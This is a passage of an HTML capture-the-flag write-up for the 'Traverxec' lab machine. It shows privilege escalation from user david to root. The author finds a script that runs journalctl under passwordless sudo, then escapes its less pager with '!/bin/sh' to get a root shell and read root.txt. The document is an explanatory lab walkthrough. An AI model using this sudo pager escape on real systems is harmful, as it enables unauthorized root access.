+				-rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;david&nbsp;david&nbsp;3.5K&nbsp;Oct&nbsp;25&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>32&nbsp;.bashrc<br>
+				drwx------&nbsp;2&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;bin<br>
+				-rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;david&nbsp;david&nbsp;&nbsp;807&nbsp;Oct&nbsp;25&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>32&nbsp;.profile<br>
+				drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;public_www<br>
+				drwx------&nbsp;2&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;.ssh<br>
+				-r--r-----&nbsp;1&nbsp;root&nbsp;&nbsp;david&nbsp;&nbsp;&nbsp;33&nbsp;Oct&nbsp;25&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>14&nbsp;user.txt<br>
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;bin
+			</div>
+		</div><br>
+		<br>
+		It looks like there's some server info gathering scripts.<br>
+			<div class="codebox">
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+				total&nbsp;16K<br>
+				drwx------&nbsp;2&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;.<br>
+				drwx--x--x&nbsp;5&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;..<br>
+				-r--------&nbsp;1&nbsp;david&nbsp;david&nbsp;&nbsp;802&nbsp;Oct&nbsp;25&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;server-stats.head<br>
+				-rwx------&nbsp;1&nbsp;david&nbsp;david&nbsp;&nbsp;363&nbsp;Oct&nbsp;25&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;server-stats.sh<br>
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;server-stats.head<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.----.<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.---------.&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;==&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+				&nbsp;&nbsp;&nbsp;Webserver&nbsp;Statistics&nbsp;and&nbsp;Data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>.-<span style="color:#3ad900;font-weight:400">"""""-.|&nbsp;|----|<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Collection&nbsp;Script&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;|&nbsp;==&nbsp;|<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(c)&nbsp;David,&nbsp;2019&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;|----|<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|'-.....-'|&nbsp;|::::|<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'"")---(""'&nbsp;|___.|<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/:::::::::::\"&nbsp;&nbsp;&nbsp;&nbsp;"</span><br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/:::</span>=======<span style="color:#ff9d00;font-weight:700">:::</span>\<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jgs&nbsp;<span style="color:#3ad900;font-weight:400">'"""""""""""""'</span>&nbsp;<br>
+				<br>
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;server-stats.sh<br>
+				<span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br>
+				<br>
+				<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>server-stats.head<br>
+				<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Load:&nbsp;`/usr/bin/uptime`"</span><br>
+				<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;"</span><br>
+				<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Open&nbsp;nhttpd&nbsp;sockets:&nbsp;`/usr/bin/ss&nbsp;-H&nbsp;sport&nbsp;=&nbsp;80&nbsp;|&nbsp;/usr/bin/wc&nbsp;-l`"</span><br>
+				<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Files&nbsp;in&nbsp;the&nbsp;docroot:&nbsp;`/usr/bin/find&nbsp;/var/nostromo/htdocs/&nbsp;|&nbsp;/usr/bin/wc&nbsp;-l`"</span><br>
+				<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;"</span><br>
+				<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Last&nbsp;5&nbsp;journal&nbsp;log&nbsp;lines:"</span><br>
+				<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sudo</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>journalctl&nbsp;-n5&nbsp;-unostromo.service&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/cat</span>
+			</div>
+		</div><br>
+		<br>
+		On the last line, <code>journalctl</code> is being run as <code>sudo</code>.<br>
+		We don't know <code>david</code>'s password, so we can't use <code>sudo</code> ourselves.<br>
+			<div class="codebox">
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sudo</span>&nbsp;<span style="color:#ff9d00;font-weight:700">whoami</span><br>
+				[<span style="color:#ff9d00;font-weight:700">sudo</span>]&nbsp;password&nbsp;fo&nbsp;david<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+				Sorry,&nbsp;try&nbsp;again.
+			</div>
+		</div><br>
+		<br>
+		However, we can use the command written in the script with <code>sudo</code> without being prompted for a password - <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code><br>
+			<div class="codebox">
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sudo</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>journalctl&nbsp;-n5&nbsp;-unostromo.service<br>
+				--&nbsp;Logs&nbsp;begin&nbsp;at&nbsp;Tue&nbsp;2020-03-17&nbsp;03<span style="color:#ff9d00;font-weight:700">:</span>30<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;EDT,&nbsp;end&nbsp;at&nbsp;Tue&nbsp;2020-03-17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;EDT.&nbsp;--<br>
+				Mar&nbsp;17&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;traverxec&nbsp;crontab[1171]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;LIST&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+				[...]
+			</div>
+		</div><br>
+		<br>
+		<code>journalctl</code> opens service log with <code>less</code>, which means we can escape the <code>less</code> with environment <code>!/bin/sh</code> and drop into a root shell.<br>
+		GTFObins outlines that here - <a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a><br>
+			<div class="codebox">
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sudo</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>journalctl&nbsp;-n5&nbsp;-unostromo.service<br>
+				--&nbsp;Logs&nbsp;begin&nbsp;at&nbsp;Tue&nbsp;2020-03-17&nbsp;03<span style="color:#ff9d00;font-weight:700">:</span>30<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;EDT,&nbsp;end&nbsp;at&nbsp;Tue&nbsp;2020-03-17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;EDT.&nbsp;--<br>
+				Mar&nbsp;17&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;traverxec&nbsp;crontab[1171]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;LIST&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+				Mar&nbsp;17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>41&nbsp;traverxec&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>[1530]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;pam_unix<span style="color:#ff9d00;font-weight:700">(su:</span>auth<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;authentication&nbsp;failure<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">logname</span>=&nbsp;ui<br>
+				Mar&nbsp;17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;traverxec&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>[1530]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;FAILED&nbsp;SU&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>to&nbsp;david<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;www-data&nbsp;on&nbsp;pts<span style="color:#ff9d00;font-weight:700">/</span>0<br>
+				Mar&nbsp;17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>09&nbsp;traverxec&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>[1537]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;pam_unix<span style="color:#ff9d00;font-weight:700">(su:</span>auth<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;authentication&nbsp;failure<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">logname</span>=&nbsp;ui<br>
+				Mar&nbsp;17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;traverxec&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>[1537]<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;FAILED&nbsp;SU&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>to&nbsp;david<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;www-data&nbsp;on&nbsp;pts<span style="color:#ff9d00;font-weight:700">/</span>0<br>
+				<span style="color:#ff9d00;font-weight:700">!/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;id</span><br>
+				<span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span><br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;cd&nbsp;/root</span><br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;cat&nbsp;root.txt</span><br>
+				9aa36a6...<br>
+			</div>
+		</div><br>
+		<br>
+	</div>
+</writeup>
+</section>
+
+</body>
+</html>
